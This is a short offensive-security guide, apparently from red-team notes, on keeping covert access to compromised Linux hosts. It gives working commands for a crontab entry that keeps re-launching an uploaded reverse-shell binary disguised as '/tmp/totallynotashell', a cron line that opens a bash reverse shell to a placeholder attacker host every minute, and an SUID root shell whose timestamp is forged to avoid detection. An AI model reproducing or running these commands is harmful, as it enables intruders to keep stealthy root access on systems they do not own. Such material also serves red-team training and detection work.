# Backdoors

Creating a backdoor is kind of an art. You can just set a while loop and have it just push out a netcat shell every minute, but you have to ensure that it's not going to clobber a previous netcat session or else you could be relatively noisy. If you don't obfuscate your IP address and processes, a backdoor can be easily detected. Since the goal here is persistence, you would need to create a backdoor that's quiet and stable. For hiding these, check out the Obfuscation section.

# Crontab

1. Upload your own reverse shell malware, for instance a bind shell from msfvenom or something, and set it to run from somewhere like /tmp/totallynotashell
1. Create a crontab entry: `crontab -l > /tmp/zc ; echo "*/1 * * * * if ! \$(ps | grep totallynotashell >/dev/null);then /tmp/totallynotashell; fi">>/tmp/zc && crontab /tmp/zc && rm /tmp/zc`

Or just keep spamming the bash TCP stack:

* `* * * * * /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0<&1 2>&1`

# SUID Shell

Included is shell.c, which can be compiled with: `gcc shell.c -o rash`

Simply upload it somewhere that the `nosuid` flag *isn't* set, which can be determined through the `mount` command. Then make sure root owns it with the SUID permissions:

```bash
target:~# chown root:wheel /usr/sbin/rash
target:~# chmod 4755 /usr/sbin/rash
target:~# export newdate=$(ls -lah /bin/bash | awk '{ print $6,$7,$8}'); touch -d "$newdate" /usr/sbin/rash
```
